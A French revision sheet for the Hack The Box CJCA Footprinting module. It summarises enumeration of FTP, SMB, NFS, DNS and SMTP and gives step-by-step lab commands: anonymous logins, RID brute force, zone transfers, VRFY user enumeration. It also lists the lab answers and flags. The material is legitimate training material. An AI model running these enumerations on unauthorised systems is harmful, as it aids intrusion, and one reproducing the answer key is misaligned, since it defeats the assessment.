# 🎯 Fiche de révision HTB CJCA — Footprinting

> **Légende**
> - 📘 Résumé du cours (traduit en français)
> - 🔑 À retenir absolument
> - ⌨️ Commandes / requêtes importantes
> - ✅ Question, réponse en français, et **Réponse à mettre sur HTB** (en anglais, telle qu'attendue)
> - 🧭 Procédure détaillée, étape par étape, pour retrouver la réponse
> - ⚠️ Passage reconstitué (absent du cours). À vérifier sur la cible.

> Cheatsheet des commandes du module : voir [cheatsheat-Footprinting.md](cheatsheat-Footprinting.md).

---

## Sommaire

1. [Page 1 — Enumeration Principles](#page-1--enumeration-principles)
2. [Page 2 — Enumeration Methodology](#page-2--enumeration-methodology)
3. [Page 3 — Domain Information](#page-3--domain-information)
4. [Page 4 — Cloud Resources](#page-4--cloud-resources)
5. [Page 5 — Staff](#page-5--staff)
6. [Page 6 — FTP](#page-6--ftp)
7. [Page 7 — SMB](#page-7--smb)
8. [Page 8 — NFS](#page-8--nfs)
9. [Page 9 — DNS](#page-9--dns)
10. [Page 10 — SMTP](#page-10--smtp)
11. [Page 11 — IMAP / POP3](#page-11--imap--pop3)
12. [Page 12 — SNMP](#page-12--snmp)
13. [Page 13 — MySQL](#page-13--mysql)
14. [Page 14 — MSSQL](#page-14--mssql)
15. [Page 15 — Oracle TNS](#page-15--oracle-tns)
16. [Page 16 — IPMI](#page-16--ipmi)
17. [Page 17 — Linux Remote Management Protocols](#page-17--linux-remote-management-protocols)
18. [Page 18 — Windows Remote Management Protocols](#page-18--windows-remote-management-protocols)
19. [Page 19 — Footprinting Lab : Easy](#page-19--footprinting-lab--easy)
20. [Page 20 — Footprinting Lab : Medium](#page-20--footprinting-lab--medium)
21. [Page 21 — Footprinting Lab : Hard](#page-21--footprinting-lab--hard)
22. [Mémo final : toutes les réponses HTB](#mémo-final--toutes-les-réponses-htb)

---

# 🔌 Bloc de connexion à la cible (pages 6 à 21)

Chaque section « Footprinting the Service » (FTP, SMB, NFS, DNS, SMTP, IMAP/POP3, SNMP, MySQL, MSSQL, Oracle TNS, IPMI, SSH/Rsync/R-Services, RDP/WinRM/WMI, labs) propose un bouton **Spawn Target** : une IP cible unique à chaque essai. Deux façons de s'y connecter.

## Option A — Depuis le Pwnbox (le plus simple)

| Étape | Action |
|---|---|
| A1 | Clique sur **Spawn Target** et note l'**IP cible** (ex. `10.129.xx.xx`) |
| A2 | Clique sur **Linux Pwnbox** → **View Linux Pwnbox** et attends le chargement du bureau |
| A3 | Ouvre un terminal dans le Pwnbox |
| A4 | Lance les commandes de la question (voir chaque question ci-dessous) directement depuis ce terminal |

## Option B — Depuis ta propre machine (VPN)

| Étape | Commande / action |
|---|---|
| B1 | Section du cours → bouton **OVPN** → **View VPN** → **Download VPN Connection File** (fichier `.ovpn`) |
| B2 | Dans un terminal, lance le VPN (laisse ce terminal ouvert) : |

```bash
sudo openvpn ~/Downloads/NOM_DU_FICHIER.ovpn
# Attendu à la fin : "Initialization Sequence Completed"
```

| Étape | Commande / action |
|---|---|
| B3 | Dans un **second terminal**, vérifie l'interface VPN : |

```bash
ip -4 addr show tun0
# Attendu : une adresse du type 10.10.14.x
```

| Étape | Commande / action |
|---|---|
| B4 | Clique sur **Spawn Target**, note l'IP cible, puis teste la connexion de base : |

```bash
ping -c 2 IP_CIBLE
```

Ensuite, utilise directement les commandes données dans chaque question (nmap, ftp, smbclient, dig, etc.) avec `IP_CIBLE`.

🔑 **Rappel de méthodologie (principes d'énumération, page 1)** : avant de foncer sur l'exploitation, identifie service → version → configuration (dangereuse ou non) → accès anonyme/credentials faibles. Ne jamais brute-forcer agressivement sans savoir ce qui est en place (risque de blacklist).

---

# Page 1 — Enumeration Principles

## 📘 Résumé

L'**énumération** (enumeration) est la collecte d'informations par des méthodes **actives** (scans) et **passives** (sources tierces). L'**OSINT** est une démarche séparée, strictement passive — elle ne fait pas partie de l'énumération active.

L'énumération est un **processus en boucle** : chaque information trouvée alimente la recherche suivante.

🔑 **Objectif** : ne pas chercher à "rentrer dans le système" directement, mais trouver **toutes les façons possibles** d'y accéder — comprendre l'infrastructure avant d'agir.

⚠️ Erreur classique : brute-forcer SSH/RDP/WinRM dès qu'on les trouve. C'est bruyant, ça peut blacklister l'IP et compromettre tout le test.

### Les 3 principes d'énumération

| N° | Principe |
|---|---|
| 1 | Il y a plus que ce qu'on voit. Considérer tous les points de vue. |
| 2 | Distinguer ce qu'on voit de ce qu'on ne voit pas. |
| 3 | Il y a toujours des moyens d'obtenir plus d'informations. Comprendre la cible. |

Questions à se poser en permanence :
- Qu'est-ce qu'on voit ? Pourquoi le voit-on ? Quelle image ça donne ? Qu'en tire-t-on ? Comment l'utiliser ?
- Qu'est-ce qu'on ne voit pas ? Pourquoi ne le voit-on pas ? Quelle image ça donne ?

## ✅ Questions de la page 1

> Cette page ne contient pas de question notée (introduction conceptuelle).

---

# Page 2 — Enumeration Methodology

## 📘 Résumé

La méthodologie HTB se découpe en **3 niveaux** et **6 couches (layers)** :

| Niveau | Couches concernées |
|---|---|
| **Infrastructure-based enumeration** | Internet Presence, Gateway |
| **Host-based enumeration** | Accessible Services, Processes |
| **OS-based enumeration** | Privileges, OS Setup |

### Les 6 couches

| N° | Couche | Description | Catégories d'informations |
|---|---|---|---|
| 1 | **Internet Presence** | Identifier la présence Internet et l'infrastructure accessible depuis l'extérieur | Domaines, sous-domaines, vHosts, ASN, netblocks, IP, instances cloud, mesures de sécurité |
| 2 | **Gateway** | Identifier les mesures de sécurité qui protègent l'infra externe/interne | Firewalls, DMZ, IPS/IDS, EDR, proxies, NAC, segmentation réseau, VPN, Cloudflare |
| 3 | **Accessible Services** | Identifier les interfaces et services accessibles (externes ou internes) | Type de service, fonctionnalité, config, port, version, interface |
| 4 | **Processes** | Identifier les process internes, sources et destinations associées aux services | PID, données traitées, tâches, source, destination |
| 5 | **Privileges** | Identifier les permissions et privilèges internes sur les services accessibles | Groupes, utilisateurs, permissions, restrictions, environnement |
| 6 | **OS Setup** | Identifier la configuration interne du système | Type d'OS, niveau de patch, config réseau, fichiers de config, fichiers sensibles |

🔑 Ce module (**Footprinting**) se concentre principalement sur la **couche 3 (Accessible Services)**.

🔑 Une méthodologie n'est **pas** un guide pas-à-pas : c'est un résumé de procédures systématiques. La collection d'outils/commandes est une **cheat-sheet**, pas la méthodologie elle-même.

🔑 Analogie : un pentest est comme un labyrinthe avec plusieurs failles (gaps) possibles. Toutes ne mènent pas à l'intérieur. Même après 4 semaines de test, on ne peut jamais garantir à 100 % qu'il n'y a plus de vulnérabilité (exemple cité : SolarWinds).

## ✅ Questions de la page 2

> Cette page ne contient pas de question notée.

---

# Page 3 — Domain Information

## 📘 Résumé

La collecte d'informations sur un domaine se fait **passivement** (pas de scan actif) : on se comporte comme un simple visiteur pour ne pas s'exposer.

### Sources passives principales

| Source | Ce qu'elle apporte |
|---|---|
| **Site web principal** | Services offerts → indices sur les technologies utilisées |
| **Certificat SSL** | Peut lister plusieurs (sous-)domaines dans le SAN |
| **crt.sh** (Certificate Transparency logs) | Historique des certificats émis → sous-domaines |
| **`host`** | Résolution des sous-domaines trouvés en IP |
| **Shodan** | Ports ouverts / services exposés sur les IP trouvées |
| **`dig any`** | Enregistrements DNS disponibles (A, MX, NS, TXT, SOA) |

### Lecture des enregistrements DNS (exemple du cours)

| Type | Rôle | Ce qu'on en tire |
|---|---|---|
| **A** | IP du (sous-)domaine | Hôtes à tester |
| **MX** | Serveur(s) mail | Fournisseur mail (ex. Google) → piste OSINT (Gdrive ouverts, etc.) |
| **NS** | Serveurs DNS | Hébergeur probable |
| **TXT** | Clés de vérification tierces, SPF/DMARC/DKIM | Révèle les **fournisseurs tiers** utilisés |

### Exemple d'interprétation des TXT records
Un enregistrement TXT du type `atlassian-domain-verification=...` indique l'usage d'**Atlassian** (Jira/Confluence/Bitbucket). `google-site-verification` indique Google Workspace. `logmein-verification-code` indique **LogMeIn** (accès distant centralisé — à risque si compromis). `v=spf1 include:mailgun.org ...` indique **Mailgun** (API mail → chercher IDOR/SSRF). Le TXT `MS=...` indique souvent un identifiant/nom d'utilisateur chez le registrar (ex. **INWX**).

## ⌨️ Commandes importantes

```bash
# Certificate Transparency (JSON)
curl -s https://crt.sh/?q=inlanefreight.com\&output=json | jq .

# Filtrer les sous-domaines uniques
curl -s https://crt.sh/?q=inlanefreight.com\&output=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Résoudre une liste de sous-domaines en IP
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

# Scanner les IP trouvées avec Shodan CLI
for i in $(cat ip-addresses.txt);do shodan host $i;done

# Tous les enregistrements DNS d'un domaine
dig any inlanefreight.com
```

## ✅ Questions de la page 3

> Cette page ne contient pas de question notée (contenu théorique, pas de lab noté).

---

# Page 4 — Cloud Resources

## 📘 Résumé

Les ressources cloud (**S3 buckets** AWS, **blobs** Azure, **cloud storage** GCP) sont souvent mal configurées et accessibles sans authentification.

### Techniques de découverte

| Technique | Détail |
|---|---|
| **Google Dorks** | `inurl:` et `intext:` pour cibler des termes précis (nom de société, extensions de fichiers) |
| **Code source des pages web** | Les ressources (images, JS, CSS) chargées depuis un cloud storage apparaissent dans le HTML |
| **domain.glass** | Vue d'ensemble de l'infra d'un domaine + statut de sécurité Cloudflare |
| **GrayHatWarfare** (buckets.grayhatwarfare.com) | Recherche de buckets AWS/Azure/GCP ouverts, filtrage par format de fichier |
| **Abréviations du nom de société** | Souvent utilisées comme préfixe de bucket |

🔑 Risque exemple du cours : des **clés SSH privées** peuvent être exposées sur un bucket mal configuré → accès direct à une ou plusieurs machines sans mot de passe.

## ✅ Questions de la page 4

> Cette page ne contient pas de question notée.

---

# Page 5 — Staff

## 📘 Résumé

L'OSINT sur les employés (LinkedIn, Xing, offres d'emploi) révèle l'infrastructure technique de l'entreprise.

### Ce qu'une offre d'emploi révèle (exemple du cours)
- **Langages** : Java, C#, C++, Python, Ruby, PHP, Perl
- **Bases de données** : PostgreSQL, MySQL, Oracle
- **Frameworks web** : Flask, Django, Spring, ASP.NET MVC
- **Outils** : Git/SVN/Perforce, CI/CD, Atlassian Suite (Confluence/Jira/Bitbucket), Docker/Kubernetes

🔑 Les profils d'employés publiés (projets GitHub, CV en ligne) peuvent exposer :
- Des **emails personnels**
- Des **tokens JWT codés en dur** dans des dépôts publics
- Les **technologies internes** réelles (ex. frameworks obsolètes avec des vulnérabilités connues → OWASP Top10 pour Django par exemple)

🔑 Stratégie de recherche LinkedIn : cibler les profils **techniques ET sécurité** pour en déduire les mesures de sécurité en place.

## ✅ Questions de la page 5

> Cette page ne contient pas de question notée.

---

# Page 6 — FTP

## 📘 Résumé

**FTP** (File Transfer Protocol, port **21** contrôle / port **20** données) est un protocole en **texte clair**. Deux modes :

| Mode | Fonctionnement |
|---|---|
| **Actif** | Le serveur initie la connexion data vers le client (bloqué par le firewall du client) |
| **Passif** | Le serveur annonce un port, le client initie la connexion data (contourne le firewall client) |

**TFTP** (UDP, pas de port 20/21) : pas d'authentification, repose uniquement sur les permissions fichiers, pas de listing de répertoire.

### Configuration vsFTPd (`/etc/vsftpd.conf`)

| Setting dangereux | Risque |
|---|---|
| `anonymous_enable=YES` | Login anonyme sans mot de passe |
| `anon_upload_enable=YES` | Upload anonyme possible |
| `write_enable=YES` | Commandes STOR/DELE/RNFR/RNTO/MKD/RMD/APPE/SITE autorisées |
| `hide_ids=YES` | Masque UID/GID réels (affiche `ftp`) — gêne l'identification des droits |
| `ls_recurse_enable=YES` | Listing récursif (`ls -R`) activé — vision complète de l'arborescence |

`/etc/ftpusers` : liste des utilisateurs **interdits** de connexion FTP (même s'ils existent sur le système Linux).

🔑 Le code **220** = bannière de bienvenue (révèle souvent le logiciel + version). Le code **230** = login réussi.

## ⌨️ Commandes importantes

```bash
# Connexion anonyme
ftp IP_CIBLE
# Name: anonymous  / password: (vide ou email bidon)

# Lister, se déplacer, télécharger, uploader
ls
get fichier.txt
put testupload.txt

# Télécharger tout le FTP d'un coup
wget -m --no-passive ftp://anonymous:anonymous@IP_CIBLE

# Footprinting Nmap
sudo nmap -sV -p21 -sC -A IP_CIBLE
sudo nmap -sV -p21 -sC -A IP_CIBLE --script-trace

# Interaction brute (sans client FTP dédié)
nc -nv IP_CIBLE 21
telnet IP_CIBLE 21

# FTP chiffré TLS/SSL
openssl s_client -connect IP_CIBLE:21 -starttls ftp
```

## ✅ Questions de la page 6

### ❓ Question 1 — Version du serveur FTP

| | |
|---|---|
| **Question (EN)** | Which version of the FTP server is running on the target system? Submit the entire banner as the answer. |
| **Question (FR)** | Quelle version du serveur FTP tourne sur la cible ? Soumets la bannière entière. |
| **Réponse (FR)** | Bannière complète du serveur FTP personnalisé |
| **Réponse à mettre sur HTB** | `InFreight FTP v1.1` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. Clique sur **Spawn Target**, note `IP_CIBLE`.
2. Pwnbox (ouvre un terminal) ou VPN :
   ```bash
   sudo openvpn ~/Downloads/NOM_DU_FICHIER.ovpn   # terminal 1
   ip -4 addr show tun0                            # terminal 2
   ping -c 2 IP_CIBLE
   ```

**Partie 1 : la recherche**

3. Connecte-toi en FTP anonyme et lis la bannière affichée immédiatement à la connexion :
   ```bash
   ftp IP_CIBLE
   ```
   La ligne `220 "..."` juste après `Connected to IP_CIBLE.` contient la bannière complète.
4. Si la bannière est tronquée, confirme avec Nmap :
   ```bash
   sudo nmap -sV -p21 -sC IP_CIBLE
   ```
   La ligne `21/tcp open ftp <bannière>` dans le résultat du script `ftp-anon`/`ftp-syst` montre le texte exact.

**Partie 2 : validation**

5. Recopie la bannière **telle quelle** (respecte majuscules/espaces) → **Submit**.

✔️ **Résultat attendu** : `InFreight FTP v1.1` (format personnalisé HTB, pas la vraie version vsFTPd).

---

### ❓ Question 2 — flag.txt sur le FTP

| | |
|---|---|
| **Question (EN)** | Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer. |
| **Question (FR)** | Énumère le serveur FTP et trouve le fichier flag.txt. Soumets son contenu. |
| **Réponse (FR)** | Contenu du flag |
| **Réponse à mettre sur HTB** | `HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}` |

**🧭 Procédure complète**

**Partie 0 : connexion** (identique à la Q1)

**Partie 1 : la recherche**

1. Connexion anonyme :
   ```bash
   ftp IP_CIBLE
   # Name: anonymous
   # Password: (laisse vide ou tape une adresse bidon)
   ```
2. Liste le contenu et cherche `flag.txt` (si pas visible à la racine, navigue dans les sous-dossiers avec `cd` puis `ls`) :
   ```
   ls
   ```
3. Télécharge-le :
   ```
   get flag.txt
   ```
4. Quitte et lis le fichier :
   ```
   exit
   cat flag.txt
   ```

✔️ **Plan B** : si l'accès anonyme ne liste rien à la racine, utilise `ls -R` une fois connecté pour un listing récursif, ou passe par Nmap :
```bash
sudo nmap -sV -p21 -sC -A IP_CIBLE
```
Le script `ftp-anon` liste directement l'arborescence accessible, flag inclus si visible.

**Partie 2 : validation**

5. Colle le contenu exact du fichier (format `HTB{...}`) → **Submit**.

---

# Page 7 — SMB

## 📘 Résumé

**SMB** (Server Message Block) gère l'accès aux fichiers/imprimantes partagés. **Samba** est l'implémentation Linux/Unix (protocole **CIFS**, dialecte de SMB).

| Version SMB | OS associé | Ports |
|---|---|---|
| CIFS | Windows NT 4.0 | NetBIOS 137/138/139 |
| SMB 1.0 | Windows 2000 | TCP direct |
| SMB 2.0/2.1/3.0/3.1.1 | Vista → Windows 10/Server 2016 | TCP **445** |

🔑 **CIFS** = NetBIOS (137-139). **SMB moderne** = port **445** exclusivement.

### Configuration Samba (`/etc/samba/smb.conf`)

| Setting dangereux | Risque |
|---|---|
| `browseable = yes` | Liste les shares disponibles |
| `guest ok = yes` | Accès sans mot de passe |
| `read only = no` / `writable = yes` | Upload/modification de fichiers |
| `enable privileges = yes` | Honore les privilèges du SID |

🔑 **Null session** (`-N` avec smbclient) = accès anonyme sans utilisateur/mot de passe valide.

## ⌨️ Commandes importantes

```bash
# Lister les shares (null session)
smbclient -N -L //IP_CIBLE

# Se connecter à un share précis
smbclient //IP_CIBLE/nom_share

# RPC : infos serveur, domaine, utilisateurs, shares
rpcclient -U "" IP_CIBLE
rpcclient $> srvinfo
rpcclient $> enumdomains
rpcclient $> querydominfo
rpcclient $> netshareenumall
rpcclient $> netsharegetinfo <share>
rpcclient $> enumdomusers
rpcclient $> queryuser <RID>

# Brute force des RID (scripté)
for i in $(seq 500 1100);do rpcclient -N -U "" IP_CIBLE -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# Impacket (énumération utilisateurs)
samrdump.py IP_CIBLE

# Outils automatisés
smbmap -H IP_CIBLE
crackmapexec smb IP_CIBLE --shares -u '' -p ''
./enum4linux-ng.py IP_CIBLE -A

# Nmap
sudo nmap IP_CIBLE -sV -sC -p139,445
```

## ✅ Questions de la page 7

### ❓ Question 1 — Version du serveur SMB

| | |
|---|---|
| **Question (EN)** | What version of the SMB server is running on the target system? Submit the entire banner as the answer. |
| **Réponse à mettre sur HTB** | `Samba smbd 4.6.2` |

**🧭 Procédure complète**

**Partie 0 : connexion** — Spawn Target, VPN/Pwnbox (voir bloc de connexion général).

**Partie 1 : recherche**
```bash
sudo nmap IP_CIBLE -sV -sC -p139,445
```
La ligne `139/tcp open netbios-ssn Samba smbd <version>` (ou `445/tcp`) donne la bannière.

**Partie 2 : validation** — Recopie exactement `Samba smbd 4.6.2` → **Submit**.

---

### ❓ Question 2 — Nom du share accessible

| | |
|---|---|
| **Question (EN)** | What is the name of the accessible share on the target? |
| **Réponse à mettre sur HTB** | `sambashare` |

**🧭 Procédure complète**

```bash
smbclient -N -L //IP_CIBLE
```
Lis la colonne `Sharename` : repère le share qui n'est pas `print$` ou `IPC$` (shares par défaut). C'est lui l'accessible → `sambashare`.

✔️ **Plan B** : `smbmap -H IP_CIBLE` ou `crackmapexec smb IP_CIBLE --shares -u '' -p ''` affichent aussi les permissions par share (READ/WRITE).

---

### ❓ Question 3 — flag.txt sur le share

| | |
|---|---|
| **Question (EN)** | Connect to the discovered share and find the flag.txt file. Submit the contents as the answer. |
| **Réponse à mettre sur HTB** | `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}` |

**🧭 Procédure complète**

```bash
smbclient //IP_CIBLE/sambashare
# Anonymous login successful si pas de credentials
smb: \> ls
smb: \> get flag.txt
smb: \> exit
cat flag.txt
```

---

### ❓ Question 4 — Domaine du serveur

| | |
|---|---|
| **Question (EN)** | Find out which domain the server belongs to. |
| **Réponse à mettre sur HTB** | `DEVOPS` |

**🧭 Procédure complète**

```bash
rpcclient -U "" IP_CIBLE
rpcclient $> querydominfo
```
Le champ `Domain:` de la sortie donne le nom (ex. `DEVOPS`).

✔️ **Plan B** : `./enum4linux-ng.py IP_CIBLE -A` → section « Domain Information via RPC » → champ `Domain:`.

---

### ❓ Question 5 — Version personnalisée du share

| | |
|---|---|
| **Question (EN)** | Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer. |
| **Réponse à mettre sur HTB** | `InFreight SMB v3.1` |

**🧭 Procédure complète**

```bash
rpcclient -U "" IP_CIBLE
rpcclient $> netsharegetinfo sambashare
```
Le champ `remark:` de la sortie contient la chaîne personnalisée (ex. version custom HTB).

✔️ **Plan B** : `smbclient -N -L //IP_CIBLE` affiche aussi le champ `Comment` à côté du nom du share.

---

### ❓ Question 6 — Chemin système complet du share

| | |
|---|---|
| **Question (EN)** | What is the full system path of that specific share? (format: "/directory/names") |
| **Réponse à mettre sur HTB** | `/home/sambauser` |

**🧭 Procédure complète**

```bash
rpcclient -U "" IP_CIBLE
rpcclient $> netsharegetinfo sambashare
```
Le champ `path:` donne le chemin Windows-style (`C:\...`) — convertis-le en syntaxe Unix demandée (`/home/sambauser`), car le serveur réel est Linux/Samba malgré l'affichage `C:\`.

---

# Page 8 — NFS

## 📘 Résumé

**NFS** (Network File System, Sun Microsystems) = équivalent SMB pour Linux/Unix. Basé sur **ONC-RPC** (ports **111** et **2049**).

| Version | Caractéristiques |
|---|---|
| NFSv2 | Ancien, UDP uniquement |
| NFSv3 | Plus de fonctions, taille de fichier variable |
| NFSv4 | Kerberos, stateful, un seul port TCP/UDP 2049, support ACL |

🔑 **Pas d'authentification native** : NFS fait confiance aux UID/GID envoyés par le client. Si on crée localement un utilisateur avec le même UID que sur le serveur, on hérite de ses droits.

### Configuration (`/etc/exports`)

| Option | Effet |
|---|---|
| `rw` | Lecture/écriture |
| `ro` | Lecture seule |
| `no_subtree_check` | Désactive la vérification des sous-arbres |
| `root_squash` | Mappe root → anonymous (protège contre un accès root via NFS) |
| `no_root_squash` ⚠️ | Garde les droits root (UID/GID 0) — **dangereux** |
| `insecure` ⚠️ | Autorise les ports > 1024 |

## ⌨️ Commandes importantes

```bash
# Lister les exports disponibles
showmount -e IP_CIBLE

# Monter un share NFS
mkdir target-NFS
sudo mount -t nfs IP_CIBLE:/ ./target-NFS/ -o nolock

# Lister avec UID/GID bruts (utile si pas de correspondance locale)
ls -n mnt/nfs/

# Démonter
cd ..
sudo umount ./target-NFS

# Nmap
sudo nmap IP_CIBLE -p111,2049 -sV -sC
sudo nmap --script nfs* IP_CIBLE -sV -p111,2049
```

## ✅ Questions de la page 8

### ❓ Question 1 — flag.txt dans le share "nfs"

| | |
|---|---|
| **Question (EN)** | Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer. |
| **Réponse à mettre sur HTB** | `HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}` |

**🧭 Procédure complète**

**Partie 0 : connexion** — Spawn Target, Pwnbox/VPN.

**Partie 1 : recherche**
```bash
showmount -e IP_CIBLE
# Repère l'export qui contient "nfs" dans son nom, ex. /mnt/nfs

mkdir target-NFS
sudo mount -t nfs IP_CIBLE:/mnt/nfs ./target-NFS/ -o nolock
ls target-NFS/
cat target-NFS/flag.txt
```

**Partie 2 : validation** — Copie le contenu exact (`HTB{...}`) → **Submit**.

✔️ **Plan B** : si le montage échoue (droits), utilise le script Nmap qui liste directement le contenu :
```bash
sudo nmap --script nfs-ls IP_CIBLE -p111,2049
```

---

### ❓ Question 2 — flag.txt dans le share "nfsshare"

| | |
|---|---|
| **Question (EN)** | Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer. |
| **Réponse à mettre sur HTB** | `HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}` |

**🧭 Procédure complète**

Identique à la Q1, mais cible l'export contenant `nfsshare` :
```bash
showmount -e IP_CIBLE
sudo mount -t nfs IP_CIBLE:/nfsshare ./target-NFS2/ -o nolock
cat target-NFS2/flag.txt
```

---

# Page 9 — DNS

## 📘 Résumé

Le **DNS** résout noms ↔ IP, sans base de données centrale (système distribué).

### Types de serveurs DNS

| Type | Rôle |
|---|---|
| Root server | Dernier recours, lie TLD ↔ IP |
| Authoritative | Fait autorité sur une zone précise |
| Non-authoritative | Collecte via requêtes récursives/itératives |
| Caching | Met en cache les réponses |
| Forwarding | Relaie vers un autre serveur DNS |
| Resolver | Résolution locale (client/routeur) |

### Enregistrements DNS

| Type | Contenu |
|---|---|
| **A** / **AAAA** | IPv4 / IPv6 |
| **MX** | Serveur(s) mail |
| **NS** | Serveurs de noms |
| **TXT** | Vérifications tierces, SPF/DMARC |
| **CNAME** | Alias vers un autre nom |
| **PTR** | Reverse lookup (IP → nom) |
| **SOA** | Infos de zone + contact admin (le `.` devient `@` dans l'email) |

### Zone transfer (AXFR)

🔑 Le **zone transfer** (TCP port 53) synchronise les enregistrements entre serveur **master** et **slave**. Si `allow-transfer` est mal configuré (subnet trop large ou `any`), **n'importe qui** peut récupérer la zone complète — fuite d'IP internes et de hostnames.

## ⌨️ Commandes importantes

```bash
# NS d'un domaine via un serveur précis
dig ns inlanefreight.htb @IP_CIBLE

# Version du serveur DNS (si activé)
dig CH TXT version.bind IP_CIBLE

# Tous les enregistrements disponibles
dig any inlanefreight.htb @IP_CIBLE

# Zone transfer (AXFR)
dig axfr inlanefreight.htb @IP_CIBLE
dig axfr internal.inlanefreight.htb @IP_CIBLE

# Brute force de sous-domaines
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @IP_CIBLE | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

# Outil automatisé
dnsenum --dnsserver IP_CIBLE --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

## ✅ Questions de la page 9

### ❓ Question 1 — FQDN du domaine inlanefreight.htb

| | |
|---|---|
| **Question (EN)** | Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain. |
| **Réponse à mettre sur HTB** | `ns.inlanefreight.htb` |

**🧭 Procédure complète**

```bash
dig ns inlanefreight.htb @IP_CIBLE
```
La section `ANSWER SECTION` montre le FQDN du serveur de noms (`NS`).

---

### ❓ Question 2 — Zone transfer / TXT record

| | |
|---|---|
| **Question (EN)** | Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...}) |
| **Réponse à mettre sur HTB** | `HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}` |

**🧭 Procédure complète**

```bash
dig axfr inlanefreight.htb @IP_CIBLE
```
Si la zone transfer fonctionne (pas de `Transfer failed`), lis les lignes `IN TXT "..."` du résultat : l'une d'elles contient le flag au format `HTB{...}`.

✔️ **Plan B** : si le domaine `inlanefreight.htb` ne contient pas le flag, le cours montre aussi un AXFR sur `internal.inlanefreight.htb` — teste les deux zones.

---

### ❓ Question 3 — IP de DC1

| | |
|---|---|
| **Question (EN)** | What is the IPv4 address of the hostname DC1? |
| **Réponse à mettre sur HTB** | `10.129.34.16` |

**🧭 Procédure complète**

```bash
dig axfr internal.inlanefreight.htb @IP_CIBLE
```
Cherche la ligne `dc1.internal.inlanefreight.htb. ... IN A <IP>`.

---

### ❓ Question 4 — FQDN finissant par x.x.x.203

| | |
|---|---|
| **Question (EN)** | What is the FQDN of the host where the last octet ends with "x.x.x.203"? |
| **Réponse à mettre sur HTB** | `win2k.dev.inlanefreight.htb` |

**🧭 Procédure complète**

1. Fais l'AXFR sur plusieurs zones candidates (`internal.inlanefreight.htb`, `dev.inlanefreight.htb`, etc.) :
   ```bash
   dig axfr dev.inlanefreight.htb @IP_CIBLE
   ```
2. Cherche la ligne `IN A` dont l'IP se termine par `.203`.

✔️ **Plan B** : si la zone `dev` n'est pas listée par le premier AXFR, utilise le brute force de sous-domaines (voir cheat-sheet) pour découvrir `dev.inlanefreight.htb`, puis refais l'AXFR dessus.

---

# Page 10 — SMTP

## 📘 Résumé

**SMTP** (port **25**, parfois **587** avec STARTTLS, **465** pour SMTPS) envoie les emails. Chaîne : **MUA** (client) → **MSA** (soumission) → **MTA**/**Open Relay** → **MDA** → boîte mail (POP3/IMAP).

### Commandes SMTP

| Commande | Rôle |
|---|---|
| `HELO` / `EHLO` | Initialise la session |
| `MAIL FROM` | Expéditeur |
| `RCPT TO` | Destinataire |
| `DATA` | Corps du message |
| `VRFY` | Vérifie si un mailbox existe (énumération d'utilisateurs) |
| `EXPN` | Idem VRFY |
| `QUIT` | Ferme la session |

🔑 **Open relay** (`mynetworks = 0.0.0.0/0`) : permet d'envoyer des mails falsifiés depuis n'importe quelle IP — spam, spoofing.

🔑 `VRFY` répond parfois **252** même pour un utilisateur inexistant (faux positif) → ne jamais se fier uniquement à l'outil automatique.

## ⌨️ Commandes importantes

```bash
# Interaction manuelle
telnet IP_CIBLE 25
HELO test
EHLO test
VRFY root

# Nmap : commandes disponibles
sudo nmap IP_CIBLE -sC -sV -p25

# Nmap : test open relay (16 tests)
sudo nmap IP_CIBLE -p25 --script smtp-open-relay -v
```

## ✅ Questions de la page 10

### ❓ Question 1 — Bannière SMTP

| | |
|---|---|
| **Question (EN)** | Enumerate the SMTP service and submit the banner, including its version as the answer. |
| **Réponse à mettre sur HTB** | `InFreight ESMTP v2.11` |

**🧭 Procédure complète**

```bash
telnet IP_CIBLE 25
```
La ligne `220 ...` affichée juste après `Connected to IP_CIBLE.` contient la bannière complète.

✔️ **Plan B** : `sudo nmap IP_CIBLE -sC -sV -p25` affiche aussi la version détectée.

---

### ❓ Question 2 — Username existant

| | |
|---|---|
| **Question (EN)** | Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer. |
| **Réponse à mettre sur HTB** | `robin` |

**🧭 Procédure complète**

```bash
telnet IP_CIBLE 25
VRFY root
VRFY admin
VRFY robin
```
⚠️ La méthode exacte de découverte n'est pas détaillée pas-à-pas dans le cours pour ce username précis — teste une liste de noms courants avec `VRFY` et retiens celui qui donne une réponse différente/confirmée (`252 2.0.0 robin`), ou utilise une wordlist de prénoms courante en brute-force manuel.

✔️ **Plan B** : utilise un script bash pour automatiser VRFY sur une wordlist :
```bash
for user in $(cat noms.txt); do echo "VRFY $user"; done | nc IP_CIBLE 25
```

---

# Page 11 — IMAP / POP3

## 📘 Résumé

**IMAP** (port **143** / **993** SSL) gère les emails **en ligne sur le serveur**, avec dossiers. **POP3** (port **110** / **995** SSL) ne fait que lister/récupérer/supprimer — pas de hiérarchie de dossiers.

### Commandes IMAP / POP3

| IMAP | POP3 |
|---|---|
| `LOGIN user pass` | `USER` / `PASS` |
| `LIST "" *` | `LIST` |
| `SELECT INBOX` | `STAT` |
| `FETCH <ID> all` | `RETR id` |
| `LOGOUT` | `QUIT` |

